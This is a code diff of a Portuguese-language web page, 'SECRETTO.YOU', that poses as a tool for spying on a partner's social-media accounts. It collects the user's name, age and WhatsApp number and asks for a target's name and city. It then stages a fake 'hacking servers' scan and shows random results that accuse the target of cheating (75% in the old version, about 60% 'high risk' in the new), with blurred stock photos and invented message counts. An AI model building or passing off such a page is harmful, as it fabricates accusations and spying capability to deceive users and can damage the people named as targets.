@@ -3,86 +3,95 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SECRETTO YOU</title>
+<title>SECRETTO.YOU</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;900&display=swap" rel="stylesheet">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap');
 * { margin:0; padding:0; box-sizing:border-box; }
-body { font-family: 'Rajdhani', sans-serif; background: #000; color:#fff; text-align:center; }
-body.piscar { background: #1a001a; animation: glitch 0.3s; }
-@keyframes glitch { 0%{transform:translate(0)} 20%{transform:translate(-2px,2px)} 40%{transform:translate(2px,-2px)} 60%{transform:translate(-2px)} 80%{transform:translate(2px)} 100%{transform:translate(0)} }
-
-.container { padding:20px 15px; max-width:450px; margin:auto; }
-h1 { font-family: 'Orbitron', sans-serif; font-size:26px; color:#ff00ff; text-shadow: 0 0 20px #ff00ff; margin-bottom:5px; letter-spacing:3px; }
-.sub { font-size:12px; color:#aa00aa; letter-spacing:2px; margin-bottom:20px; }
-.caixa { background: linear-gradient(180deg, #0a0a0a, #000); padding:20px; border-radius:10px; border:1px solid #ff00ff; box-shadow: 0 0 30px rgba(255,0,255,0.4); margin-bottom:20px; }
-input, select { width:100%; padding:14px; margin:8px 0; background:#050505; border:1px solid #ff00ff; border-radius:5px; color:#ff00ff; font-size:16px; text-align:center; font-weight:700; }
-input::placeholder{ color:#550055; }
-.btn { width:100%; padding:16px; background: linear-gradient(90deg, #ff00ff, #aa00aa); border:none; border-radius:5px; color:#fff; font-size:18px; font-weight:900; cursor:pointer; margin-top:10px; font-family: 'Orbitron'; box-shadow: 0 0 15px rgba(255,0,255,0.6); }
-.btn:active { transform: scale(0.95); }
-.btn-gps { background: linear-gradient(90deg, #00ffff, #00aaaa); color:#000; box-shadow: 0 0 15px rgba(0,255,255,0.6); }
+body { font-family: 'Montserrat', sans-serif; background: #000 url('https://i.imgur.com/8Qm9QZq.jpg') no-repeat center top; background-size: cover; color:#fff; text-align:center; min-height:100vh; }
+.overlay { background: rgba(0,0,0,0.85); min-height:100vh; padding:20px 15px; }
+.container { padding:20px 15px; max-width:420px; margin:auto; }
+.logo { margin:10px 0 20px; }
+.logo svg { width:60px; height:60px; }
+.logo h1 { font-size:28px; font-weight:900; letter-spacing:2px; }
+.logo h1 span { color:#ff0040; }
+.sub { font-size:12px; color:#ff0040; letter-spacing:3px; margin-bottom:25px; }
+.caixa { background: rgba(10,10,10,0.8); padding:25px; border-radius:15px; border:1px solid #ff0040; box-shadow: 0 0 30px rgba(255,0,64,0.3); margin-bottom:20px; backdrop-filter: blur(5px); }
+input, select { width:100%; padding:14px; margin:8px 0; background:#111; border:1px solid #333; border-radius:8px; color:#fff; font-size:15px; text-align:center; font-weight:600; }
+.btn { width:100%; padding:16px; background: linear-gradient(90deg, #ff0040, #cc0033); border:none; border-radius:10px; color:#fff; font-size:16px; font-weight:900; cursor:pointer; margin-top:10px; text-transform:uppercase; }
+.btn-outline { background:transparent; border:1px solid #ff0040; color:#ff0040; }
+.btn-gps { background: linear-gradient(90deg, #00aaff, #0088cc); }
+.btn-insta { background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); border: none; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration:none; }
+.btn-insta svg { width:20px; height:20px; fill:#fff; }
 #cadastro, #formulario, #resultado { display:none; }
-
-/* CARROSSEL */
-.carousel { position:relative; width:100%; max-width:350px; margin:15px auto; }
-.carousel-container { overflow:hidden; border-radius:10px; border:2px solid #ff00ff; background:#000; touch-action: pan-y; }
+.app-selector { display:flex; justify-content:space-around; margin:15px 0; gap:8px; }
+.app-item { flex:1; padding:10px 5px; background:#111; border:2px solid #333; border-radius:10px; cursor:pointer; transition:0.2s; }
+.app-item.active { border-color:#ff0040; background:#1a0008; box-shadow:0 0 10px rgba(255,0,64,0.5); }
+.app-item img { width:30px; height:30px; margin-bottom:5px; }
+.app-item p { font-size:9px; color:#aaa; }
+.radar-box { width:200px; height:200px; margin:20px auto; position:relative; border:2px solid #ff0040; border-radius:50%; background: radial-gradient(circle, rgba(255,0,64,0.1) 0%, transparent 70%); }
+.radar-line { position:absolute; top:50%; left:50%; width:2px; height:100px; background: linear-gradient(transparent, #ff0040); transform-origin: bottom center; animation: scan 2s linear infinite; }
+@keyframes scan { from {transform: translateX(-50%) rotate(0deg);} to {transform: translateX(-50%) rotate(360deg);} }
+.radar-ping { position:absolute; width:8px; height:8px; background:#ff0040; border-radius:50%; box-shadow:0 0 10px #ff0040; animation: ping 1.5s infinite; }
+@keyframes ping { 0%{transform:scale(0); opacity:1;} 100%{transform:scale(3); opacity:0;} }
+.vantagens { display:flex; justify-content:space-between; gap:10px; margin:25px 0; }
+.vantagem { flex:1; font-size:10px; }
+.vantagem svg { width:35px; height:35px; fill:#ff0040; margin-bottom:5px; }
+.carousel { position:relative; width:100%; margin:15px auto; }
+.carousel-container { overflow:hidden; border-radius:15px; border:2px solid #ff0040; background:#000; }
 .carousel-track { display:flex; transition: transform 0.3s ease-out; }
-.carousel-item { min-width:100%; background:#050505; padding:20px 20px 10px 20px; }
-.carousel-btn { position:absolute; top:50%; transform:translateY(-50%); background:rgba(255,0,255,0.9); border:none; color:#fff; font-size:25px; width:35px; height:35px; border-radius:5px; cursor:pointer; z-index:10; }
+.carousel-item { min-width:100%; background:#050505; padding:20px; }
+.avatar { width:120px; height:120px; border-radius:10px; background-size:cover; background-position:center; border:2px solid #ff0040; margin:0 auto 10px; position:relative; }
+.borrado { filter: blur(18px); }
+.online { position:absolute; bottom:8px; right:8px; width:12px; height:12px; background:#00ff88; border-radius:50%; border:2px solid #000; }
+.carousel-btn { position:absolute; top:50%; transform:translateY(-50%); background:rgba(255,0,64,0.9); border:none; color:#fff; font-size:20px; width:35px; height:35px; border-radius:50%; cursor:pointer; z-index:10; }
 .prev { left:5px; }.next { right:5px; }
 .dots { display:flex; justify-content:center; gap:6px; margin-top:10px; }
-.dot { width:6px; height:6px; border-radius:50%; background:#330033; border:1px solid #ff00ff; }
-.dot.active { background:#ff00ff; box-shadow:0 0 10px #ff00ff; }
-.slide-counter { color:#00ffff; font-size:12px; font-weight:700; margin-bottom:5px; }
-
-/* RODAPÉ DAS FOTOS */
-.carousel-footer { font-size:10px; color:#666; margin-top:8px; border-top:1px solid #220022; padding-top:8px; }
-.carousel-footer b { color:#ff00ff; }
-
-.avatar { width:140px; height:140px; border-radius:10px; background-size:cover; background-position:center; border:2px solid #ff00ff; margin:0 auto 10px; position:relative; }
-.borrado { filter: blur(20px); }
-.online { position:absolute; bottom:8px; right:8px; width:15px; height:15px; background:#00ff00; border-radius:50%; border:3px solid #000; }
-
-.card { background: linear-gradient(180deg, #0a000a, #000); padding:20px; border-radius:10px; border:2px solid #ff00ff; animation: aparecer 0.5s; }
-@keyframes aparecer { from {opacity:0; transform:scale(0.9);} to {opacity:1; transform:scale(1);} }
-.status-traida { color:#ff00ff; font-size:18px; margin-bottom:10px; font-family: 'Orbitron'; }
-.status-nao { color:#00ffff; font-size:22px; font-family: 'Orbitron'; }
-.contador-conversas { color:#00ffff; font-size:20px; margin:10px 0; font-weight:700; }
-#mapa { height:220px; border-radius:10px; margin-top:15px; border:2px solid #ff00ff; display:none; }
-.loading-bar { background:#111; border-radius:5px; margin:15px 0; border:1px solid #ff00ff; }
-.progress { height:25px; background: linear-gradient(90deg, #ff00ff, #00ffff); width:0%; }
-.scan-text { color:#00ffff; font-size:12px; font-family: 'Orbitron'; }
-.info-box { background:#0a0a0a; border:1px solid #330033; border-radius:10px; padding:20px; margin-top:20px; text-align:left; }
-.info-title { color:#ff00ff; font-size:18px; font-family:'Orbitron'; margin-bottom:15px; text-align:center; }
-.etapa { display:flex; align-items:flex-start; margin:15px 0; font-size:14px; }
-.etapa-num { background:linear-gradient(135deg, #ff00ff, #aa00aa); color:#000; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:900; margin-right:12px; flex-shrink:0; }
-.rodape { font-size:9px; color:#333; margin-top:20px; text-align:center; }
+.dot { width:7px; height:7px; border-radius:50%; background:#330011; border:1px solid #ff0040; }
+.dot.active { background:#ff0040; }
+.card { background: rgba(10,0,10,0.9); padding:20px; border-radius:15px; border:2px solid #ff0040; }
+.status-traida { color:#ff0040; font-size:18px; margin-bottom:10px; font-weight:900; }
+.status-nao { color:#00aaff; font-size:16px; margin-bottom:10px; font-weight:900; }
+.contador-conversas { color:#00aaff; font-size:18px; margin:10px 0; font-weight:700; }
+#mapa { height:220px; border-radius:10px; margin-top:15px; border:2px solid #ff0040; display:none; }
+.loading-bar { background:#111; border-radius:10px; margin:15px 0; border:1px solid #ff0040; }
+.progress { height:25px; background: linear-gradient(90deg, #ff0040, #00aaff); width:0%; border-radius:10px; transition: width 0.2s; }
+.scan-text { color:#00aaff; font-size:12px; font-weight:700; }
+.rodape { font-size:10px; color:#444; margin-top:20px; }
 </style>
 </head>
 <body>
+<div class="overlay">
 <div class="container">
-    <h1>SECRETTO YOU</h1>
-    <p class="sub">SISTEMA DE INTELIGÊNCIA</p>
+    <div class="logo">
+        <svg viewBox="0 0 24 24"><path fill="#ff0040" d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/><path fill="#000" d="M12 14a3 3 0 100-6 3 3 0 000 6z"/></svg>
+        <h1>SECRETTO<span>.YOU</span></h1>
+        <p class="sub">SISTEMA DE INTELIGÊNCIA</p>
+    </div>
 
-    <!-- TELA 1: CADASTRO NO INICIO -->
     <div class="caixa" id="cadastro">
-        <p style="color:#ff00ff; font-size:20px; font-weight:900; margin-bottom:10px;">ACESSO RESTRITO</p>
-        <p style="font-size:14px; margin-bottom:15px;">Ative seu acesso para continuar</p>
-        <input type="text" id="cad_nome" placeholder=">> SEU PRIMEIRO NOME">
-        <input type="number" id="cad_idade" placeholder=">> SUA IDADE" min="18" max="99">
-        <input type="tel" id="cad_tel" placeholder=">> SEU WHATSAPP COM DDD" maxlength="15">
-        <p style="font-size:10px; color:#999; margin:10px 0;">Dados criptografados. Uso +18</p>
+        <p style="color:#ff0040; font-size:20px; font-weight:900; margin-bottom:10px;">ACESSO RESTRITO</p>
+        <input type="text" id="cad_nome" placeholder="SEU PRIMEIRO NOME">
+        <input type="number" id="cad_idade" placeholder="SUA IDADE" min="18" max="99">
+        <input type="tel" id="cad_tel" placeholder="SEU WHATSAPP COM DDD" maxlength="15">
         <button class="btn" onclick="salvarCadastro()">ATIVAR ACESSO</button>
     </div>
 
-    <!-- TELA 2: SCAN -->
     <div class="caixa" id="formulario">
-        <input type="text" id="nome" placeholder=">> NOME DO ALVO">
-        <div>
-            <input type="text" id="cidade" placeholder=">> LOCALIZAÇÃO">
-            <button class="btn btn-gps" onclick="pegarLocalizacao()">📡 RASTREAR GPS</button>
+        <input type="text" id="nome" placeholder="NOME DO ALVO">
+        <input type="text" id="cidade" placeholder="CIDADE DO ALVO">
+        <button class="btn btn-gps" onclick="pegarLocalizacao()">📡 USAR MINHA LOCALIZAÇÃO</button>
+        <p style="margin:15px 0 5px; font-size:12px; color:#aaa;">SELECIONE A REDE SOCIAL</p>
+        <div class="app-selector">
+            <div class="app-item" onclick="selecionarApp(this, 'WhatsApp')"><img src="https://cdn-icons-png.flaticon.com/512/3670/3670051.png"><p>WhatsApp</p></div>
+            <div class="app-item" onclick="selecionarApp(this, 'Instagram')"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png"><p>Instagram</p></div>
+            <div class="app-item" onclick="selecionarApp(this, 'Facebook')"><img src="https://cdn-icons-png.flaticon.com/512/733/733547.png"><p>Facebook</p></div>
         </div>
-        <input type="text" id="app" placeholder=">> REDE SOCIAL ALVO">
+        <div class="app-selector">
+            <div class="app-item" onclick="selecionarApp(this, 'TikTok')"><img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png"><p>TikTok</p></div>
+            <div class="app-item" onclick="selecionarApp(this, 'Telegram')"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png"><p>Telegram</p></div>
+        </div>
+        <input type="hidden" id="app_selecionado">
         <select id="sexo">
             <option value="mulher">ANALISAR MULHER</option>
             <option value="homem">ANALISAR HOMEM</option>
@@ -92,170 +101,100 @@ input::placeholder{ color:#550055; }
 
     <div id="resultado"></div>
 
-    <div class="info-box">
-        <p class="info-title">>> PROTOCOLO DE USO <<</p>
-        <div class="etapa"><div class="etapa-num">1</div><div>Ative seu acesso</div></div>
-        <div class="etapa"><div class="etapa-num">2</div><div>Insira os dados do alvo</div></div>
-        <div class="etapa"><div class="etapa-num">3</div><div>Inicie a Análise</div></div>
-        <div class="etapa"><div class="etapa-num">4</div><div>Arraste para ver os contatos</div></div>
+    <div class="vantagens">
+        <div class="vantagem"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg><p>DISCRIÇÃO<br>TOTAL</p></div>
+        <div class="vantagem"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg><p>PERFIL<br>ANÔNIMO</p></div>
+        <div class="vantagem"><svg viewBox="0 0 24 24"><path d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.06 3.73-1.47 0-2.74-1.04-2.89-2.55C8.11 4.47 7 3.51 6 3.5 4.5 3.5 3 5 3 7c0 1.55.55 2.57 1.43 3.21C4.16 11.14 3 13.4 3 16c0 3.87 3.13 7 7 7s7-3.13 7-7c0-2.6-1.16-4.86-2.97-6.21C14.45 9.57 15 8.55 15 7c0-2-1.5-3.5-3-3.5-.55 0-1.09.14-1.57.39.08.59.07 1.21-.05 1.8.64.12 1.24.36 1.76.69C13.05 4.94 13.5 2.67 13.5.67z"/></svg><p>ENCONTROS<br>SECRETOS</p></div>
     </div>
 
-    <p class="rodape">SECRETTO YOU v3.0</p>
+    <a href="https://www.instagram.com/secretto.yo?igsh=bzRpYWwwbGo2cDRl&utm_source=qr" target="_blank" class="btn btn-insta">
+        <svg viewBox="0 0 24 24"><path d="M7.8 2h8.4C19.4 2 22 4.6 22 9.2v5.6c0 4.6-2.6 7.2-6.8 7.2H7.8C4.6 22 2 19.4 2 14.8V9.2C2 4.6 4.6 2 7.8 2m-.2 2A3.6 3.6 0 0 0 4 7.6v8.8C4 20.39 5.61 22 7.6 22h8.8a3.6 3.6 0 0 0 3.6-3.6V7.6C20 5.61 18.39 4 16.4 4H7.6m9.65 1.5a1.25 1.25 0 0 1 1.25 1.25A1.25 1.25 0 0 1 17.25 8 1.25 1.25 0 0 1 16 6.75a1.25 1.25 0 0 1 1.25-1.25M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3z"/></svg>
+        NOSSO INSTAGRAM
+    </a>
+    <p class="rodape">SECRETTO.YOU v3.3</p>
+</div>
 </div>
 
-<audio id="somAlerta" src="https://cdn.pixabay.com/download/audio/2022/03/24/audio_d1716fce92.mp3"></audio>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-// CADASTRO NO INICIO
-window.onload = function(){
-    if(localStorage.getItem("secretto_user")){
-        document.getElementById("formulario").style.display = "block";
-    } else {
-        document.getElementById("cadastro").style.display = "block";
-    }
-    // Mascara telefone
-    document.getElementById('cad_tel').addEventListener('input', function(e){
-        let v = e.target.value.replace(/\D/g, '');
-        if(v.length <= 11) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
-        e.target.value = v;
-    });
+let appSelecionado = '';
+function selecionarApp(el, app){
+    document.querySelectorAll('.app-item').forEach(i=>i.classList.remove('active'));
+    el.classList.add('active');
+    appSelecionado = app;
+    document.getElementById('app_selecionado').value = app;
 }
-
 function salvarCadastro(){
-    var nome = document.getElementById("cad_nome").value.trim();
-    var tel = document.getElementById("cad_tel").value.replace(/\D/g, '');
-    var idade = document.getElementById("cad_idade").value;
-    if(nome == "" || tel.length < 10 || idade == "" || idade < 18){
-        alert("PREENCHA CORRETAMENTE. IDADE MINIMA 18 ANOS");
-        return;
-    }
-    localStorage.setItem("secretto_user", "ok");
-    document.getElementById("cadastro").style.display = "none";
-    document.getElementById("formulario").style.display = "block";
-}
-
-const nomesHomem = ["Carlos", "Pedro", "Lucas", "Rafael", "Bruno"];
-const nomesMulher = ["Ana", "Julia", "Beatriz", "Camila", "Mariana"];
-var mapa; var currentSlide = 0; var totalSlides = 0; var startX = 0; var isDragging = false;
-
-function iniciarMapa(lat, lon, cidade){
-    document.getElementById("mapa").style.display = "block";
-    if(mapa) mapa.remove();
-    mapa = L.map('mapa').setView([lat, lon], 14);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapa);
-    L.circleMarker([lat, lon], {color: '#ff0000', fillColor: '#ff0000', fillOpacity: 1, radius: 15}).addTo(mapa).openPopup();
+    let nome = document.getElementById('cad_nome').value;
+    if(nome.length < 2){ alert('Preencha seu nome'); return; }
+    localStorage.setItem('secretto_user', nome);
+    document.getElementById('cadastro').style.display='none';
+    document.getElementById('formulario').style.display='block';
 }
 function pegarLocalizacao(){
     if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(function(position){
-            var lat = position.coords.latitude; var lon = position.coords.longitude;
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(res => res.json()).then(data => {
-                var cidade = data.address.city || data.address.state;
-                document.getElementById("cidade").value = cidade.toUpperCase();
-                iniciarMapa(lat, lon, cidade.toUpperCase());
-            });
+        navigator.geolocation.getCurrentPosition(pos => {
+            document.getElementById('cidade').value = pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4);
         });
     }
 }
-function resetar(){ location.reload(); }
-
-function criarCarousel(quantidade, sexoOposto){
-    totalSlides = quantidade; let items = ''; let dots = '';
-    let listaNomes = sexoOposto == "homem"? nomesHomem : nomesMulher;
-    for(let i = 0; i < quantidade; i++){
-        let nome = listaNomes[Math.floor(Math.random()*listaNomes.length)];
-        let idade = Math.floor(Math.random() * 15) + 20;
-        let avatarId = sexoOposto == "homem"? Math.floor(Math.random()*35) + 1 : Math.floor(Math.random()*35) + 36;
-        let avatar = "https://i.pravatar.cc/300?img=" + avatarId;
-
-        items += `
-        <div class="carousel-item">
-            <p class="slide-counter">${i+1}/${quantidade}</p>
-            <div style="position:relative;">
-                <div class="avatar borrado" style="background-image:url(${avatar})"></div>
-                <div class="online"></div>
-            </div>
-            <p style="font-size:22px; color:#ff00ff; font-weight:900;">${nome}</p>
-            <p>${idade} ANOS</p>
-            <p style="color:#00ffff; font-size:14px;">● ONLINE</p>
-            <!-- RODAPÉ EMBAIXO DA FOTO -->
-            <div class="carousel-footer">
-                Arraste para o lado <b>→</b> | @secretto.you
-            </div>
-        </div>`;
-        dots += `<div class="dot ${i==0?'active':''}"></div>`;
-    }
-
-    // Ativa touch
-    setTimeout(() => {
-        let container = document.getElementById("carouselContainer");
-        if(container){
-            container.addEventListener('touchstart', e => { startX = e.touches[0].clientX; isDragging = true; });
-            container.addEventListener('touchend', e => {
-                if(!isDragging) return;
-                let diff = startX - e.changedTouches[0].clientX;
-                if(Math.abs(diff) > 50){ if(diff > 0) moverSlide(1); else moverSlide(-1); }
-                isDragging = false;
-            });
-        }
-    }, 100);
-
-    return `<div class="carousel"><button class="carousel-btn prev" onclick="moverSlide(-1)">‹</button><div class="carousel-container" id="carouselContainer"><div class="carousel-track" id="track">${items}</div></div><button class="carousel-btn next" onclick="moverSlide(1)">›</button><div class="dots" id="dots">${dots}</div></div>`;
-}
-
-function moverSlide(dir){
-    currentSlide = (currentSlide + dir + totalSlides) % totalSlides;
-    document.getElementById("track").style.transform = `translateX(-${currentSlide * 100}%)`;
-    document.querySelectorAll(".dot").forEach((d,i)=> d.classList.toggle("active", i==currentSlide));
-}
-
-function barraCarregamento(callback){
-    let progress = document.getElementById("progress");
-    let width = 0;
-    let intervalo = setInterval(() => {
-        width += 3;
-        progress.style.width = width + "%";
-        if(width >= 100){ clearInterval(intervalo); callback(); }
-    }, 50);
-}
-
 function detectar(){
-    var nomeDigitado = document.getElementById("nome").value.toUpperCase();
-    var cidadeDigitada = document.getElementById("cidade").value.toUpperCase();
-    var sexo = document.getElementById("sexo").value;
-    var res = document.getElementById("resultado");
-    var form = document.getElementById("formulario");
-    var som = document.getElementById("somAlerta");
-    var body = document.body;
+    if(!appSelecionado){ alert('Selecione uma rede social'); return; }
+    document.getElementById('formulario').style.display='none';
+    document.getElementById('resultado').style.display='block';
+    document.getElementById('resultado').innerHTML = `
+    <div class="caixa">
+        <p class="scan-text">ESCANEANDO ${appSelecionado}...</p>
+        <div class="radar-box"><div class="radar-line"></div><div class="radar-ping" style="top:30%; left:60%;"></div><div class="radar-ping" style="top:70%; left:40%; animation-delay:0.5s;"></div></div>
+        <div class="loading-bar"><div class="progress" id="progress"></div></div>
+        <div class="carousel"><button class="carousel-btn prev" onclick="moverSlide(-1)">‹</button><div class="carousel-container"><div class="carousel-track" id="track"></div></div><button class="carousel-btn next" onclick="moverSlide(1)">›</button><div class="dots" id="dots"></div></div>
+        <button class="btn" onclick="mostrarResultado()">VER RESULTADO</button>
+    </div>`;
+    simularProgresso(); gerarSlides();
+}
+function simularProgresso(){
+    let p = 0; let el = document.getElementById('progress');
+    let i = setInterval(()=>{ p+=4; el.style.width=p+'%'; if(p>=100) clearInterval(i); }, 150);
+}
+let slideAtual = 0;
+function gerarSlides(){
+    let track = document.getElementById('track'); let dots = document.getElementById('dots');
+    for(let i=0;i<3;i++){
+        track.innerHTML += `<div class="carousel-item"><p>CONTATO ${i+1} - ${appSelecionado}</p><div class="avatar borrado" style="background-image:url(https://i.pravatar.cc/200?img=${i+10})"><div class="online"></div></div></div>`;
+        dots.innerHTML += `<div class="dot ${i==0?'active':''}" onclick="irSlide(${i})"></div>`;
+    }
+}
+function moverSlide(d){ slideAtual = Math.max(0, Math.min(2, slideAtual+d)); atualizarSlide(); }
+function irSlide(i){ slideAtual=i; atualizarSlide(); }
+function atualizarSlide(){ document.getElementById('track').style.transform = `translateX(-${slideAtual*100}%)`; document.querySelectorAll('.dot').forEach((d,i)=>d.classList.toggle('active',i==slideAtual)); }
 
-    if(nomeDigitado == "" || cidadeDigitada == ""){ alert("PREENCHA TODOS OS CAMPOS"); return; }
+function mostrarResultado(){
+    let risco = Math.random() > 0.4;
+    let frasesBaixoRisco = ["PERFIL SEM ATIVIDADE SUSPEITA","NÍVEL DE SEGURANÇA: ESTÁVEL","NENHUM SINAL CRÍTICO ENCONTRADO","COMPORTAMENTO DENTRO DO PADRÃO","SEM VÍNCULOS OCULTOS DETECTADOS"];
+    let fraseSorteada = frasesBaixoRisco[Math.floor(Math.random() * frasesBaixoRisco.length)];
+    let conversas = Math.floor(Math.random() * 5);
 
-    form.style.display = "none";
-    res.style.display = "block";
-    res.innerHTML = `<div class="loading-bar"><div class="progress" id="progress"></div></div><p class="scan-text">INVADINDO SERVIDORES...</p>`;
-
-    barraCarregamento(() => {
-        setTimeout(function(){
-            // 75% DE CHANCE DE TRAIR
-            var traida = Math.random() < 0.75;
-
-            if(traida){
-                var quantidade = Math.floor(Math.random() * 4) + 2; // 2 a 5 pessoas
-                var conversas = Math.floor(Math.random() * 60) + 20;
-                var sexoAmante = sexo == "homem"? "mulher" : "homem";
-                currentSlide = 0;
-                som.play().catch(()=>{});
-                body.classList.add("piscar");
-                setTimeout(()=> body.classList.remove("piscar"), 500);
-
-                res.innerHTML = `<div class="card"><p class="status-traida">⚠ ALERTA SECRETTO: ${nomeDigitado} TRAIU ⚠</p><p class="contador-conversas">${quantidade} CONTATOS + ${conversas} MENSAGENS</p>${criarCarousel(quantidade, sexoAmante)}<p>LOCAL: ${cidadeDigitada}</p><div id="mapa"></div><button class="btn" onclick="resetar()">NOVA ANÁLISE</button></div>`;
-
-                fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${cidadeDigitada}`).then(res => res.json()).then(data => { if(data[0]){ iniciarMapa(parseFloat(data[0].lat), parseFloat(data[0].lon), cidadeDigitada); } });
-            } else {
-                res.innerHTML = `<div class="card"><p class="status-nao">✓ ALVO SEGURO ✓</p><p>NENHUMA ATIVIDADE SECRETTO ENCONTRADA</p><button class="btn" onclick="resetar()">NOVA ANÁLISE</button></div>`;
-            }
-        }, 500);
-    });
+    if(risco){
+        document.getElementById('resultado').innerHTML = `
+        <div class="card">
+            <p class="status-traida">⚠️ ALTO RISCO DETECTADO</p>
+            <p class="contador-conversas">${Math.floor(Math.random() * 200) + 50} Conversas Suspeitas em ${appSelecionado}</p>
+            <div id="mapa"></div>
+            <button class="btn" onclick="alert('Dados liberados para visualização')">ACESSAR DADOS</button>
+        </div>`;
+    } else {
+        document.getElementById('resultado').innerHTML = `
+        <div class="card">
+            <p class="status-nao">✅ ${fraseSorteada}</p>
+            <p class="contador-conversas">${conversas} Conversas Analisadas em ${appSelecionado}</p>
+            <button class="btn btn-outline" onclick="detectar()">FAZER NOVA ANÁLISE</button>
+        </div>`;
+    }
+    setTimeout(()=>{ if(risco){document.getElementById('mapa').style.display='block'; let mapa = L.map('mapa').setView([-23.5, -46.6], 11); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapa);}}, 300)
+}
+window.onload = () => {
+    if(localStorage.getItem('secretto_user')){ document.getElementById('formulario').style.display='block'; }
+    else{ document.getElementById('cadastro').style.display='block'; }
 }
 </script>
 </body>
